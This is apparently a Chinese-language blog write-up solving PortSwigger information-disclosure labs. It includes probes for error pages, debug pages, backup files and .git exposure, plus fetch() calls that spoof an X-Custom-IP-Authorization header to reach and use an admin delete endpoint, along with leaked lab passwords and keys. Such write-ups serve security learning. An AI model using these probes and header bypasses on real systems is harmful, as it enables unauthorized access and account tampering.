---
title: Information disclosure
description: Information disclosure
last_update:
  date: "2025-10-07T08:00:00+08:00"
---

## Lab: Information disclosure in error messages

| Dimension | Description                                                                                           |
| --------- | ----------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/information-disclosure/exploiting#error-messages                 |
| Lab       | https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages |

嘗試 `/product?productId=%27`

```
Internal Server Error: java.lang.NumberFormatException: For input string: "'"
	at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:67)
	at java.base/java.lang.Integer.parseInt(Integer.java:647)
	at java.base/java.lang.Integer.parseInt(Integer.java:777)
	at lab.c.w.x.y.Z(Unknown Source)
	at lab.o.go.g.z.h(Unknown Source)
	at lab.o.go.i.z.p.E(Unknown Source)
	at lab.o.go.i.e.lambda$handleSubRequest$0(Unknown Source)
	at s.x.s.t.lambda$null$3(Unknown Source)
	at s.x.s.t.N(Unknown Source)
	at s.x.s.t.lambda$uncheckedFunction$4(Unknown Source)
	at java.base/java.util.Optional.map(Optional.java:260)
	at lab.o.go.i.e.y(Unknown Source)
	at lab.server.k.a.n.l(Unknown Source)
	at lab.o.go.v.B(Unknown Source)
	at lab.o.go.v.l(Unknown Source)
	at lab.server.k.a.k.p.B(Unknown Source)
	at lab.server.k.a.k.b.lambda$handle$0(Unknown Source)
	at lab.c.t.z.p.Q(Unknown Source)
	at lab.server.k.a.k.b.Q(Unknown Source)
	at lab.server.k.a.r.V(Unknown Source)
	at s.x.s.t.lambda$null$3(Unknown Source)
	at s.x.s.t.N(Unknown Source)
	at s.x.s.t.lambda$uncheckedFunction$4(Unknown Source)
	at lab.server.gv.B(Unknown Source)
	at lab.server.k.a.r.G(Unknown Source)
	at lab.server.k.w.c.q(Unknown Source)
	at lab.server.k.q.m(Unknown Source)
	at lab.server.k.c.m(Unknown Source)
	at lab.server.gd.F(Unknown Source)
	at lab.server.gd.r(Unknown Source)
	at lab.x.e.lambda$consume$0(Unknown Source)
	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1144)
	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:642)
	at java.base/java.lang.Thread.run(Thread.java:1583)

Apache Struts 2 2.3.31
```

通常這種 Application Server 噴的錯誤訊息，只能當作漏洞挖掘的入口，不能單獨算一個漏洞，實務上我看過好幾個 ASP.NET 的服務都有這個問題

## Lab: Information disclosure on debug page

| Dimension | Description                                                                                       |
| --------- | ------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/information-disclosure/exploiting#debugging-data             |
| Lab       | https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page |

首頁的 HTML 看到 `<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->`

訪問 `/cgi-bin/phpinfo.php`

搜尋 SECRET_KEY，看到 `axkx2kh24eql5x9tbbcrw50j0t0fqp23`，成功解題～

## Lab: Source code disclosure via backup files

| Dimension | Description                                                                                                    |
| --------- | -------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/information-disclosure/exploiting#source-code-disclosure-via-backup-files |
| Lab       | https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files           |

先訪問 `/robots.txt`，看到

```
User-agent: *
Disallow: /backup
```

再訪問 `/backup`，發現有 Directory Listing，之後訪問 `/backup/ProductTemplate.java.bak`，成功看到 DB 密碼～

```java
package data.productcatalog;

import common.db.JdbcConnectionBuilder;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class ProductTemplate implements Serializable
{
    static final long serialVersionUID = 1L;

    private final String id;
    private transient Product product;

    public ProductTemplate(String id)
    {
        this.id = id;
    }

    private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
    {
        inputStream.defaultReadObject();

        ConnectionBuilder connectionBuilder = ConnectionBuilder.from(
                "org.postgresql.Driver",
                "postgresql",
                "localhost",
                5432,
                "postgres",
                "postgres",
                "qcwho9h1825jdqvdle5iitnpetl9xylz"
        ).withAutoCommit();
        try
        {
            Connection connect = connectionBuilder.connect(30);
            String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
            Statement statement = connect.createStatement();
            ResultSet resultSet = statement.executeQuery(sql);
            if (!resultSet.next())
            {
                return;
            }
            product = Product.from(resultSet);
        }
        catch (SQLException e)
        {
            throw new IOException(e);
        }
    }

    public String getId()
    {
        return id;
    }

    public Product getProduct()
    {
        return product;
    }
}
```

## Lab: Authentication bypass via information disclosure

| Dimension | Description                                                                                                                 |
| --------- | --------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/information-disclosure/exploiting#information-disclosure-due-to-insecure-configuration |
| Lab       | https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass                   |

之前有學過 [Trace HTTP Request Method](../http/http-request-methods-2.md)，沒想到在這個 Lab 真的用上了

嘗試 `TRACE /my-account`，得到

```
TRACE /my-account HTTP/1.1
Host: 0a5a00f004aaa755815f7a68004e002e.web-security-academy.net
cache-control: no-cache
Content-Length: 0
X-Custom-IP-Authorization: aaa.xxx.yy.zzz
```

嘗試在登入情況戳

```js
fetch(`${location.origin}/my-account`, {
  headers: { "X-Custom-IP-Authorization": "127.0.0.1" },
});
```

可以看到回傳的 HTML 有 admin panel

```html
<section class="top-links">
    <a href=/>Home</a><p>|</p>
    <a href="/admin">Admin panel</a><p>|</p>
    <a href="/my-account?id=wiener">My account</a><p>|</p>
    <a href="/logout">Log out</a><p>|</p>
</section>
```

接著嘗試

```js
fetch(`${location.origin}/admin`, {
  headers: { "X-Custom-IP-Authorization": "127.0.0.1" },
});
```

回傳的 HTML

```html
<div>
  <span>carlos - </span>
  <a href="/admin/delete?username=carlos">Delete</a>
</div>
```

接著嘗試

```js
fetch(`${location.origin}/admin/delete?username=carlos`, {
  headers: { "X-Custom-IP-Authorization": "127.0.0.1" },
});
```

成功解題～

## Lab: Information disclosure in version control history

| Dimension | Description                                                                                                    |
| --------- | -------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/information-disclosure/exploiting#version-control-history                 |
| Lab       | https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history |

這題是 .git 暴露，直接用 DotGit 下載，再用 VSCode 打開

然後 `git log`，之後 `git reset head^`，就可以看到 `ADMIN_PASSWORD=cm4t2pzcdewyj6kke5on`

## 小結

這個系列算簡單，基本上都是我在真實世界遇過的漏洞，一天就解完了

## 參考資料

- https://portswigger.net/web-security/information-disclosure
